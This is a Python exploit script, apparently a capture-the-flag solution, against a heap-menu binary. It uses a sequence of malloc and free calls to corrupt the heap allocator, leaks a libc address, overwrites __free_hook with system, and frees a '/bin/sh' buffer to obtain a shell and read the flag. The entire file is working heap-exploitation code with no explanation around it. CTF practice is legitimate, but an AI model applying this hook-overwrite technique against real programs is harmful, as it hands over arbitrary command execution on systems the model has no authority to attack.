#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./prob_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x13CB
brva 0x14AA
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def menu(choice: int):
    slna(b'choice: ', choice)

def malloc(idx: int, length: int, data: bytes):
    menu(0)
    slna(b'index: ', idx)
    slna(b'length: ', length)
    sla(b'tion: ', data)

def free(idx: int):
    menu(1)
    slna(b'index: ', idx)

# ==================== EXPLOIT ====================

p = start()
malloc(0, 0x70, b"")

for i in range(0, 10):
    malloc(i, 0x2c0, b"")

for i in range(1, 4):
    free(i)

for i in range(6, 10):
    free(i)
free(4)
free(5)

for i in range(0, 8):
    malloc(i, 0x50, b"\xa8")

for i in range(0, 7):
    free(i)

for i in range(9, -1, -1):
    malloc(i, 0x20, b"\xa8")
for i in range(0, 10):
    free(i)
free(7)

for i in range(0, 7):
    malloc(i, 0x20, b"\xa8")
malloc(0, 0x20, b"")

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

malloc(0, 0x20, b"")
malloc(0, 0x20, b"")
malloc(0, 0x20, b"")
malloc(0, 0x20, b"\x63")

menu(9999)
leak = p.recvuntil("choice: ").split(b'\x7f')
leak = p.recvuntil("choice: ").split(b'\x7f')[-2]

libc_leak = u64((ru(b"\x7f")[-6:]).ljust(8, b"\x00"))
libc.address = libc_leak - 0x9D850

info('libc leak @ %#x', libc_leak)
slog('libc base @ %#x', libc.address)

menu(-1)

for i in range(0, 10):
    malloc(i, 0x30, b"A")
for i in range(0, 10):
    free(i)
free(7)

for i in range(0, 7):
    malloc(i, 0x30, b"A")
malloc(0, 0x30, p64(libc.sym.__free_hook))
malloc(0, 0x30, p64(libc.sym.__free_hook))
malloc(0, 0x30, p64(libc.sym.__free_hook))
malloc(0, 0x30, p64(libc.sym.system))
malloc(0, 0x100, b"/bin/sh\x00")
free(0)


sl(b"cat flag*")
interactive()
